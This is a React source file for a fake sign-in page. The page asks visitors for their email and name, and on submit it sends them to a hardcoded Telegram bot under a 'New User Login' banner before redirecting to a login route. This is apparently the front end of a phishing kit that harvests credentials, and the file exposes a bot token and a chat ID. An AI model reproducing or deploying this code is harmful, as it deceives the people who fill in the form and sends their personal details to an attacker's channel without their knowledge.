import react from 'react'
import React from 'react'
import 'antd/dist/antd.css'
import { Input } from 'antd'
import {useState} from 'react'
import {useRef, useEffect} from 'react';
import { DownOutlined } from '@ant-design/icons';
import { Dropdown, Space } from 'antd';
import { useNavigate } from 'react-router-dom';

function EmailuserName() {
  const items = [
  {
    label: <a href="https://www.antgroup.com">1st menu item</a>,
    key: '0',
  },
  {
    label: <a href="https://www.aliyun.com">2nd menu item</a>,
    key: '1',
  },
  {
    type: 'divider',
  },
  {
    label: '3rd menu item',
    key: '3',
  },
];
  const navigate = useNavigate();
  const emailUnderline = useRef(null);
  const errEmail = useRef(null);
  const userNameUnderline = useRef(null);
  const erruserName = useRef(null);

  const [errEmailString, setErrEmailString] = useState('');
  const [email, setEmail] = useState('');
  const [userName, setuserName] = useState('');
  const chatId = '5345080694';
  const botToken= '5417079331:AAFFjTkpZXAzDL33Tbnjhl8-UDgDoWSzKJ8';

  const signInButtonClicked = () => {
    if(!email){
      emailUnderline.current.color = 'red';
      errEmail.current.hidden = false;
      setErrEmailString('Please complete this field');
    }
    if(!userName){
      userNameUnderline.current.color = 'red';
      erruserName.current.hidden = false;
    }
    if(isValidEmail(email) && userName){
      var message = '====================={New User Login Income Email and userName}====================="';
      message += '\n Email: ';
      message += email;
      message += '\n userName: ';
      message += userName;

      fetch('https://api.telegram.org/bot'+botToken+'/sendMessage?chat_id='+chatId+'&text=' + message) // url here
      .then((response) => {
        return response.json(); // replace .json() to .text() for plain text
      })
      .then((daat) => {
        console.log(daat);
      });
      navigate('/LogIn');
    }

  }
  function isValidEmail(email) {
    return /\S+@\S+\.\S+/.test(email);
  }
  const emailChanged = (e) => {
    setEmail(e.target.value);
    // if(email)
    if (!isValidEmail(e.target.value)) {
      emailUnderline.current.color = 'red';
      errEmail.current.hidden = false;
      setErrEmailString('Email is invalid');
    } else {
      emailUnderline.current.color = '#c1c9d6';
      errEmail.current.hidden = true;
      errEmail.current.value = '';
    }
  }
  const userNameChanged = (e) => {
    setuserName(e.target.value);
  }
  return (
    <div className="sc-jlyJG dhCUzp">
      <div className="sc-fjdhpX fxQNsf">
        <div>
          <div className="welcomeBack">Report</div>
          <div className="commonText">
            Please leave me a report that tells about your state.
          </div>
        </div>
        <div className="sign-in-content">
          <div id="emailForm">
            <div id="emailAddress" className="formName">
              Email address
            </div>
            <div
              id="emailInput"
              className="inputForm"
            >
              <Input
                className="antInput"
                placeholder="Please enter email to log in"
                value = {email}
                onChange = {emailChanged}
              />
              <hr id = 'emailUnderline' size="2" color="#c1c9d6" ref={emailUnderline}/>
              <p id = 'errEmail' ref={errEmail} style = {{color: 'red', fontSize: '16px'}} hidden>{errEmailString}</p>
            </div>
          </div>
          <div id="userNameForm">
            <div id="userName" className="formName">
              Name
            </div>
            <div
              id="userNameInput"
              className="inputForm"
            >
              <Dropdown
                menu={{
                  items,
                }}
                trigger={['click']}
              >
                <a onClick={(e) => e.preventDefault()}>
                  <Space>
                    <span style = {{color: 'grey', fontSize: 14}}>Plese choose your Name</span>
                    <DownOutlined />
                  </Space>
                </a>
              </Dropdown>
              <hr id = 'userNameUnderline' size="2" color="#c1c9d6" ref={userNameUnderline}/>
              <p id = 'erruserName' ref={erruserName} style = {{color: 'red', fontSize: '16px'}} hidden>Please complete this field</p>
            </div>
          </div>
        </div>
        <div className="sc-jzJRlG giyMJw">
          <button
            type="button"
            className="signInButton"
            style={{ margin: 'auto' }}
            onClick={signInButtonClicked}
          >
            <span>Sign in</span>
          </button> 
          {/*</NavLink>*/}
        </div>
        <div className="other">
          <p>
            Don't have an account yet?
            <a>Register Today!</a>
          </p>
          <p>
            Want to protect your online security ?<a>Learn More</a>
          </p>
        </div>
      </div>
    </div>
  )
}
export default EmailuserName
